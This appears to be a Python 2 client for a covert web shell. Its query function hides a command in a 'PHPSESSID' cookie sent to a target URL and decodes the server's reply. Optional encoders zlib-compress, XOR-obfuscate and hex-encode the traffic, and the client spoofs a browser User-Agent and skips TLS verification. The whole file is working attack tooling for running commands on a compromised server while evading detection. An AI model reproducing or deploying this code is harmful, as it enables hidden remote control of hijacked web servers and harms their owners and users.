#!/usr/bin/env python

import os
import zlib
import random

from requests import exceptions, Session as RequestsSession

class Session( RequestsSession ):

	def __init__( self, *args, **kwargs ):
		super( Session, self ).__init__( *args, **kwargs )
		self.headers['User-Agent'] = user_agent()

def user_agent():
	return random.choice([
		'Mozilla/5.0',
	])

def compress( payload ):
	return zlib.compress( payload, 9 )

def decompress( payload ):
	if payload=='': return ''
	return zlib.decompress( payload )

def encrypt( payload, key ):
	result = ''
	current = 0
	for ii in range( len(payload) ):
		current = ord( payload[ii] )\
				^ ord( key[ ii % len(key) ])\
				^ current
		result += chr(current)
	return result

def pad( length ):
	return os.urandom( length )

def encode( payload, key, strength=None ):
	return encrypt( pad(strength or len(key)) + payload, key )

def decrypt( payload, key ):
	result = ''
	current = 0
	for ii in range( len(payload) ):
		result += chr( ord( payload[ii] )\
				^ ord( key[ ii % len(key) ])\
				^ current )
		current = ord(payload[ii])
	return result

def decode( payload, key, strength=None ):
	return decrypt( payload, key )[strength or len(key):]

def std_encoder( payload, key ):
	return payload

def std_decoder( data, key ):
	return data

def query(  url,
			cmd,
			key='',
			session=None,
			action='PHPSESSID',
			encoder=std_encoder,
			decoder=std_decoder ):

	session = session or Session()
	payload = encoder( cmd, key )
	cookies = { action: payload }
	response = session.request( method='get',
								url=url,
								cookies=cookies,
								data=None,
								timeout=30,
								verify=False,
								allow_redirects=True )
	return decoder( response.text, key ).strip()

def xor_gzip_encoder( payload, key ):
	return encode(compress( payload ), key ).encode( 'hex' )

def xor_gzip_decoder( data, key ):
	return decompress(decode(data.decode('hex'),key))
